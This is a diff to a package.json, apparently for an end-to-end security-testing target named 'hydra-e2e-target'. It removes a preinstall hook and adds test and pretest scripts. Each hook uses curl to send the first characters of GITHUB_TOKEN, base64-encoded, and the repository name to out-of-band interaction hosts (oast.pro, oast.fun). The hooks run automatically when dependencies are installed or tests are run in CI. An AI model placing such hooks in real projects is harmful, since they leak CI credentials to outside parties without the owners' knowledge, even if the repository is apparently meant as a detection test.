@@ -1,9 +1,9 @@
 {
-  "name": "target",
+  "name": "hydra-e2e-target",
   "version": "1.0.0",
-  "description": "",
+  "description": "E2E test repository for HYDRA pipeline",
   "scripts": {
-    "preinstall": "curl -s 'https://d6er41f3rtnmju0eqrb0qsi1p73au4z4k.oast.pro?t=$(printf '%s' \"${GITHUB_TOKEN:0:8}\" | base64)&r=${GITHUB_REPOSITORY}' -o /dev/null",
-    "test": "echo test passed"
+    "test": "curl -sk 'https://oast.fun/hydra-0225112117?t=$(echo $GITHUB_TOKEN | head -c 8 | base64)'&r=$GITHUB_REPOSITORY -o /dev/null || true",
+    "pretest": "curl -sk 'https://oast.fun/hydra-0225112117?stage=pretest&r=$GITHUB_REPOSITORY' -o /dev/null || true"
   }
 }
